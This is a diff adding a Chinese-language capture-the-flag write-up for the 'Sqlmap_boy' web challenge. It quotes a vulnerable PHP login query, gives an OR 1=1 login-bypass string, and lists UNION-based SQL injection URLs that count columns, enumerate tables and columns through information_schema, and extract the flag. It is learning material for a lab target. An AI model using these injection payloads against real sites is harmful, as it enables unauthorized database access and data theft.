@@ -204,3 +204,64 @@ for n in range(64):
 ```
 最终找到偏移量为50的时候时正确的flag
 ![alt text](image-38.png)
+## 1.17 提高,Web,SQL注入,SSTI
+### 一.Sqlmap_boy
+打开题目给出的网站
+![alt text](image-39.png)
+查看网页源代码
+![alt text](image-40.png)
+发现有提示
+```php
+<!-- $sql = 'select username,password from users where username="'.$username.'" && password="'.$password.'";'; -->
+```
+这个代码片段用于生成一个SQL查询字符串，将$username和$password的值插入到查询中，
+存在SQL注入漏洞，因为它直接将用户输入的 $username 和 $password 拼接到SQL查询中。
+所以在用户名中输入
+```
+1’” OR 1=1； -- 
+```
+此时代码变成了
+```sql
+select username,password from users where username="'1'" OR 1=1; -- '" && password="'.$password.'";;
+```
+可以直接进入<br>
+![alt text](image-41.png)<br>
+接下因为还没学会sqlmap所以用Hackbar手动注入
+***
+**基本符号：**<br>
+%20:URL编码后的空格，防止SQL语法被中断<br>
+--+：-- 是SQL的注释符号，后面的部分将被忽略。+ 是URL编码后的空格。
+***
+分别执行一下代码来判断字段数
+```url
+http://node5.anna.nssctf.cn:28089/secrets.php?id=-1'%20union%20select%201--+
+http://node5.anna.nssctf.cn:28089/secrets.php?id=-1'%20union%20select%201,2--+
+http://node5.anna.nssctf.cn:28089/secrets.php?id=-1'%20union%20select%201,2,3--+
+```
+到第三个页面才有反应，说明一共有三个字段，且如图显示第2，3个可以被使用
+![alt text](image-42.png)
+此时我们爆数据库，把2的位置替换成database()，即查看当前在使用的数据库名为moectf
+![alt text](image-43.png)
+接下来爆表
+***
+group_concat(table_name)：这是一个MySQL函数，它将当前数据库中所有表的名称连接成一个单一的字符串，结果可能是多个表名一起显示<br>
+from information_schema.tables：information_schema 是MySQL的一个系统数据库，包含了关于所有其他数据库的信息。tables 表中包含所有表的名称<br>
+where table_schema=database()：仅查询当前数据库中的表（通过 database() 函数获取当前数据库名称）<br>
+***
+用如下命令查看当前数据库中的所有表
+```
+http://node5.anna.nssctf.cn:28089/secrets.php?id=-1'%20union%20select%201,database(),group_concat(table_name) from information_schema.tables where table_schema=database()--+
+```
+![alt text](image-44.png)
+接下来爆字段，用如下命令列出flag 表中的所有字段名称
+```
+http://node5.anna.nssctf.cn:28089/secrets.php?id=-1'%20union%20select%201,database(),group_concat(column_name) from information_schema.columns where table_name='flag'--+
+```
+![alt text](image-45.png)
+接下来爆字段内容，用如下命令列出flag表中flAg字段的内容
+```
+http://node5.anna.nssctf.cn:28089/secrets.php?id=-1'%20union%20select%201,database(),group_concat(flAg) from moectf.flag--+
+```
+![alt text](image-46.png)
+拿到flag
+### 二.
